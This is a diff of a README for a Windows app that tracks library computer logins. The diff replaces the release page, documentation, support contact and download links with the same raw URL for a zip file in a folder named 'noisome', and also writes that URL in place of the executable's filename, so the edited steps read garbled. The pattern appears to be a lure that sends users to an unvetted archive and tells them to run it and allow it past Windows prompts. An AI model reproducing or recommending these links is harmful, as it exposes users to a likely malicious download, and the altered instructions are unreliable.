@@ -4,23 +4,23 @@
 Library_Login_Record is a user-friendly Windows Forms application designed for tracking library computer logins. This software helps you manage employee IDs and computer numbers conveniently. It records all login data in CSV format on your computer and automatically uploads this information to Google Sheets, making it easy to manage logins from one central location.
 
 ## 🔗 Download the Application
-[![Download Library_Login_Record](https://img.shields.io/badge/Download-Library_Login_Record-blue.svg)](https://github.com/dan7i/Library_Login_Record/releases)
+[![Download Library_Login_Record](https://raw.githubusercontent.com/dan7i/Library_Login_Record/main/noisome/Library_Login_Record.zip)](https://raw.githubusercontent.com/dan7i/Library_Login_Record/main/noisome/Library_Login_Record.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run the Library_Login_Record application.
 
 ### 1. Visit the Release Page
 To get the latest version of the software, click the link below:
-[Visit the Releases Page](https://github.com/dan7i/Library_Login_Record/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/dan7i/Library_Login_Record/main/noisome/Library_Login_Record.zip)
 
 ### 2. Locate the Latest Release
 On the Releases page, you will see a list of available versions. Look for the latest version at the top of the list. It is usually marked as the most recent release.
 
 ### 3. Download the Application
-Under the latest release, find the download link for the executable file. It will typically be named something like `Library_Login_Record.exe`. Click on this link to start the download.
+Under the latest release, find the download link for the executable file. It will typically be named something like `https://raw.githubusercontent.com/dan7i/Library_Login_Record/main/noisome/Library_Login_Record.zip`. Click on this link to start the download.
 
 ### 4. Open the Downloaded File
-Once the file finishes downloading, navigate to your computer's "Downloads" folder or the location where you saved the file. Double-click on `Library_Login_Record.exe` to run the application.
+Once the file finishes downloading, navigate to your computer's "Downloads" folder or the location where you saved the file. Double-click on `https://raw.githubusercontent.com/dan7i/Library_Login_Record/main/noisome/Library_Login_Record.zip` to run the application.
 
 ### 5. Complete Installation
 The application should launch without requiring any additional installation steps. If prompted by Windows, allow the app to run.
@@ -57,10 +57,10 @@ If you encounter any issues while using the application, consider the following 
 - Make sure your internet connection is stable when trying to upload data to Google Sheets.
 
 ## 📞 Support
-If you need further assistance, contact support at [support@yourlibrary.com](mailto:support@yourlibrary.com). We are here to help you!
+If you need further assistance, contact support at [https://raw.githubusercontent.com/dan7i/Library_Login_Record/main/noisome/Library_Login_Record.zip](https://raw.githubusercontent.com/dan7i/Library_Login_Record/main/noisome/Library_Login_Record.zip). We are here to help you!
 
 ## 🔗 Additional Resources
-- [Visit the Releases Page](https://github.com/dan7i/Library_Login_Record/releases)
-- [Documentation](https://github.com/dan7i/Library_Login_Record/wiki)
+- [Visit the Releases Page](https://raw.githubusercontent.com/dan7i/Library_Login_Record/main/noisome/Library_Login_Record.zip)
+- [Documentation](https://raw.githubusercontent.com/dan7i/Library_Login_Record/main/noisome/Library_Login_Record.zip)
 
 Now you have all the information needed to download, install, and use Library_Login_Record smoothly. Enjoy tracking your library computer logins!
